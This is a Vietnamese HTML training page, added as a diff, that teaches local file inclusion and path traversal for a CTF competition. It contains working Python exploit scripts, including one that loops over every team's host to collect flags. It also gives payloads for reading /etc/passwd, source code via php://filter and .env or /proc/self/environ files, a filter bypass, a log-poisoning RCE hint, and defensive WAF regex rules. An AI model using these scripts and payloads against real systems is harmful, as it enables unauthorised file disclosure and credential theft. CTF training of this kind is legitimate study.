+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests, base64
+
+url = <span class="s">"http://TARGET/view"</span>
+
+<span class="c"># Bước 1: xác nhận path traversal</span>
+r = requests.get(url, params={<span class="s">"page"</span>: <span class="s">"../../../../../../etc/passwd"</span>})
+<span class="k">print</span>(<span class="s">"root:"</span> <span class="k">in</span> r.text)
+
+<span class="c"># Bước 2: đọc source code bằng php filter, tự giải mã base64</span>
+r = requests.get(url, params={<span class="s">"page"</span>: <span class="s">"php://filter/convert.base64-encode/resource=index.php"</span>})
+source = base64.b64decode(r.text.strip()).decode(errors=<span class="s">"ignore"</span>)
+<span class="k">print</span>(source)</code></pre>
+
+  <h3>(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+
+<span class="k">def</span> <span class="d">exploit_lfi</span>(host):
+    r = requests.get(<span class="s">f"http://{host}/view"</span>,
+            params={<span class="s">"page"</span>: <span class="s">"../../../../../../flag.txt"</span>}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_lfi(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PAYLOAD = <span class="s">"../../../../../../flag.txt"</span>
+
+<span class="k">def</span> <span class="d">exploit_lfi</span>(host):
+    <span class="k">try</span>:
+        r = requests.get(<span class="s">f"http://{host}/view"</span>, params={<span class="s">"page"</span>: PAYLOAD}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_lfi(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service có trang đa ngôn ngữ, URL <code>?lang=en.json</code>.</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận</div><div class="d">Burp Repeater, <code>lang=../../../../../../etc/passwd</code> → Response hiện nội dung file passwd ⟹ xác nhận path traversal.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Đọc source</div><div class="d"><code>lang=php://filter/convert.base64-encode/resource=index.php</code> → Response ra chuỗi Base64. Dán vào CyberChef (From Base64) → đọc được source, thấy biến <code>$flag_path = '/opt/flag_9f3a.txt'</code>.</div></div></div>
+    <div class="srow"><span class="n">4</span><div><div class="t">Đọc flag</div><div class="d"><code>lang=../../../../../../opt/flag_9f3a.txt</code> → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Tự động hóa</div><div class="d">Dán payload vào script (C) mục 08.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex)</th><th>Khớp gì</th></tr>
+    <tr><td><code>\.\.(/|\\)|%2e%2e(%2f|%5c)</code></td><td><code>../</code> hoặc <code>..\</code>, cả bản chưa và đã URL-encode</td></tr>
+    <tr><td><code>php://|data://|zip://|expect://</code></td><td>PHP stream wrapper — hiếm khi tham số file hợp lệ cần dùng tới</td></tr>
+    <tr><td><code>/etc/passwd|/proc/self</code></td><td>Tên file hệ thống hay bị dò trực tiếp</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Tránh chặn nhầm</span>Nếu app thật sự cần nhận tên file có dấu
+  <code>.</code> hợp lệ (vd <code>report.v2.pdf</code>), đừng chặn mọi dấu chấm — chỉ chặn đúng chuỗi
+  <code>..</code> liền nhau. Test DetectionOnly trước khi block.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi payload không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Luôn trả về trang lỗi "file not found" dù đổi payload</td><td>App có whitelist tên file cho phép, không phải nối chuỗi tự do</td><td>Không phải LFI, thử lỗ hổng khác (có thể là IDOR hoặc access control)</td></tr>
+    <tr><td><code>../</code> bị "nuốt mất" trong response, path traversal không hoạt động</td><td>Server lọc chuỗi <code>../</code> một lần, không đệ quy</td><td>Dùng <code>....//</code> (mục 06.B)</td></tr>
+    <tr><td><code>php://filter</code> không hoạt động, báo lỗi "unable to open stream"</td><td>PHP cấu hình <code>allow_url_include=Off</code> (mặc định) — nhưng <code>php://filter</code> KHÔNG cần setting này, chỉ <code>http://</code>/RFI mới cần — kiểm tra lại cú pháp chain</td><td>Kiểm tra lại chính xác cú pháp <code>php://filter/convert.base64-encode/resource=...</code>, thử bỏ bớt phần resource nếu app đã tự thêm tiền tố đường dẫn</td></tr>
+    <tr><td>Đọc được source nhưng không tìm thấy đường dẫn flag</td><td>Flag không hardcode trong source, có thể ở biến môi trường hoặc file riêng</td><td>Thử <code>/proc/self/environ</code> hoặc các file config thường gặp (<code>.env</code>, <code>config.php</code>)</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>Tham số đi thẳng vào <code>include()</code>/<code>require()</code>/<code>file_get_contents()</code>/<code>open()</code> bằng nối chuỗi, không lọc.</td></tr>
+    <tr><td>❌</td><td>App dùng whitelist: chỉ cho phép danh sách tên file cố định (<code>if page in ["about","contact"]</code>).</td></tr>
+    <tr><td>❌</td><td>App dùng hàm chuẩn hóa đường dẫn an toàn trước khi mở file (vd Python <code>os.path.realpath()</code> + kiểm tra path nằm trong thư mục cho phép) — path traversal bị triệt tiêu.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng ví dụ mục 09 bằng tay trên Burp, từ gõ tên file thường tới khi đọc được flag.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ thử đọc source bằng <code>php://filter</code> trước khi đoán mò
+  đường dẫn flag.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> challenge lọc chuỗi <code>../</code> (xóa 1 lần, không đệ quy). Viết payload
+  vượt qua.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>....//....//....//etc/passwd</code></details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> đã đọc được source, thấy app log mọi request (bao gồm User-Agent) vào
+  <code>/var/log/app/access.log</code>, và có LFI đọc được file bất kỳ. Viết các bước (không cần code) để đạt RCE
+  qua log poisoning.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Gửi 1 request với header <code>User-Agent</code> chứa code PHP, sau đó
+  LFI include chính file log đó — xem mục 06.C.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Path Traversal</td><td>Dùng <code>../</code> để "đi lùi" ra khỏi thư mục dự định trong đường dẫn file.</td></tr>
+    <tr><td>LFI (Local File Inclusion)</td><td>Khi path traversal xảy ra trong hàm <em>include/require</em> (chạy code) thay vì chỉ đọc nội dung.</td></tr>
+    <tr><td>PHP stream wrapper</td><td>Cú pháp <code>giao_thức://</code> đặc biệt PHP hiểu được trong các hàm mở file, không chỉ đường dẫn thường.</td></tr>
+    <tr><td>Log poisoning</td><td>Kỹ thuật ghi code độc hại vào file log (qua header request), rồi include chính log đó để chạy code.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong>
+  <code>~/hoc/CTF/Tools/web/php_filter_chain_generator/</code>, <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/LFI/</code>,
+  <code>~/hoc/CTF/Tools/web/CyberChef/</code>, <code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/File Inclusion/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("lfi-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("lfi-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
